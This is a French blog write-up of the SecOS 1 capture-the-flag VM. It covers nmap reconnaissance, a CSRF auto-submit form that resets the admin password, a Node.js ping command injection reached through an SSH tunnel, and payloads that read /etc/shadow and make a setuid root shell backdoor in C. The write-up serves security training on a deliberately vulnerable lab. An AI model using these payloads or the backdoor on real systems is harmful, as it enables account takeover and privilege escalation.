# Solution du CTF SecOS 1

Nitro
-----

Le challenge [SecOS premier du nom](http://vulnhub.com/entry/secos-1,88/) se présente comme un boot2root (c'est à dire qu'il faut récupérer l'accès root) web-based.  

La VM peut se monter depuis *VirtualBox*, c'est une *Ubuntu* 32 bits. Il faut créer une nouvelle VM et sélectionner le fichier existant comme disque virtuel.  

One time
--------

Deux ports sont ouverts : un SSH ainsi qu'un serveur web servi par Node.js.  

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-05-24 12:08 CEST
Nmap scan report for 192.168.1.20
Host is up (0.00023s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
|_  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
8081/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Web App
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=6.46%I=7%D=5/24%Time=53806FA6%P=x86_64-suse-linux-gnu%r(NU
SF:LL,27,"SSH-2\.0-OpenSSH_6\.6p1\x20Ubuntu-2ubuntu1\r\n");
MAC Address: 08:00:27:2E:F6:F7 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=6.46%E=4%D=5/24%OT=22%CT=1%CU=43345%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=53806FB2%P=x86_64-suse-linux-gnu)SEQ(SP=FF%GCD=3%ISR=105%TI=Z%CI=I%II=
OS:I%TS=8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%
OS:O5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W
OS:6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)
```

Le site web utilise *Bootstrap* pour le JS et CSS donc on a l'impression de déjà connaître le site avant l'avoir visité :p   

Je lance [Wapiti](http://wapiti.sourceforge.net/) qui ne trouve rien d'intéressant.  

Le site dispose d'une zone privée pour les utilisateurs connectés depuis laquelle ils peuvent s'échanger des messages. Malheureusement, après création d'un utilisateur *toto*, toujours pas de faille à l'horizon.  

Une page liste les utilisateurs enregistrés, voici un extrait :  

![Utilisateurs enregistrés](https://raw.githubusercontent.com/devl00p/blog/master/images/secos_users.png)

Je lance [dirb](http://dirb.sourceforge.net/) qui me trouve une page */hint* dans laquelle on trouve en code source :  

```html
      <div class="jumbotron">
        <p><i>Are you sure there's something to see here?</i></p>
        <!--
        First: the admin visits the website (really) frequently
        Second: He runs it locally, on 127.0.0.1. 
        Third: CSRF and /(http:\/\/[-\/\.\w:0-9\?&]+)/gi, I think that's enough
        !-->
      </div>
```

Effectivement il n'y a pas de token anti-CSRF. D'après l'expression régulière on devine que le simple fait de poster une URL provoquera une requête depuis le compte *spiderman* (l'administrateur).  

On créé la page index.html suivante avec formulaire auto-submit que l'on livre avec *SimpleHTTPServer* :  

```html
<html>
<body>
<form action="http://127.0.0.1:8081/change-password" method="POST" id="inject">
    <input type="hidden" name="username" value="spiderman" />
    <input type="hidden" name="password" value="hacked" />
</form>
<script language="Javascript">
    document.getElementById("inject").submit();
</script>
</body>
<html>
```

On envoie ensuite un message à *spiderman* avec l'URL de notre serveur. On voit rapidement apparaître une requête dans les logs, ça a fonctionné :)  

```plain
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.20 - - [24/May/2014 17:21:14] "GET / HTTP/1.1" 200 -
```

On se connecte alors avec l'utilisateur *spiderman* et le mot de passe *hacked* sur la webapp. Direction les messages privés...  

![spiderman private messages](https://raw.githubusercontent.com/devl00p/blog/master/images/secos_spiderman_msg.png)

Visiblement pirate a fait le travail pour nous :) Il ne reste qu'à se connecter en SSH sur la machine avec *spiderman* et *CrazyPassword!* :  

```plain
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sat May 24 12:07:20 CEST 2014

  System load: 1.04              Memory usage: 8%   Processes:       78
  Usage of /:  23.3% of 6.50GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Wed May  7 18:19:57 2014 from 192.168.56.1
spiderman@SecOS-1:~$ 
```

Two time
--------

Avec un *pstree -a* on voit que deux Nodes.js tournent dont l'un en root :  

```plain
  ├─sudo -u spiderman sh -c /usr/local/bin/node /home/spiderman/vnwa/server.js
  │   └─sh -c /usr/local/bin/node /home/spiderman/vnwa/server.js
  │       └─node /home/spiderman/vnwa/server.js
  │           └─5*[{node}]
  ├─sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
  │   └─sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
  │       └─node /home/spiderman/vnwa/internalServer.js
  │           └─5*[{node}]
```

Il y a deux infos intéressantes dans *internalServer.js* : d'abord il écoute sur le port 9000 (mais sur le loopback) et ensuite il semble y avoir une faille d'injection de commande.  

```js
app.post('/', function (req, res) {
    ip = req.body.ip
    if (ip == "") {
        utils.redirect(req, res, '/ping-status');
    } else {
        // getting the command with req.params.command
        var child;
        // console.log(req.params.command);
        child = exec('ping ' + ip, function (error, stdout, stderr) {
            res.render('ping.ejs', {
                isConnected: req.session.isConnected,
                message: stdout,
                isAdmin: req.session.isAdmin
            });
        });
    }
});

server.listen(9000, '127.0.0.1', function() {
  console.log("Listening on port 9000");
});
```

On créé un tunnel SSH afin de rediriger notre port 8888 local vers le port interne 9000 de la VM :  

```bash
ssh -L 8888:127.0.0.1:9000 spiderman@192.168.1.20
```

La page contient un champ de formulaire qui est en effet vulnérable : si on rentre *;cat /etc/shaddow* ont voit les hashs des utilisateurs (sha512, inutile de perdre du temps là dessus).  

On écrit une petite backdoor setuid que l'on compile :  

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```

Il n'y a plus qu'à injecter *;chown root:root /tmp/gotroot;chmod 4755 /tmp/gotroot* comme adresse IP.  

![injection de commande dans le formulaire ping](https://raw.githubusercontent.com/devl00p/blog/master/images/secos_ping.png)

On lance la backdoor qui nous donne les bons droits...  

```plain
root@SecOS-1:/root# cat flag.txt 
Hey,

Congrats, you did it ! 

The flag for this first (VM) is: MickeyMustNotDie.
Keep this flag because it will be needed for the next VM.

If you liked the Web application, the code is available on Github. 
(https://github.com/PaulSec/VNWA)

There should be more VMs to come in the next few weeks/months.

Twitter: @PaulWebSec
GitHub : PaulSec
```

Done !

*Published May 24 2014 at 17:27*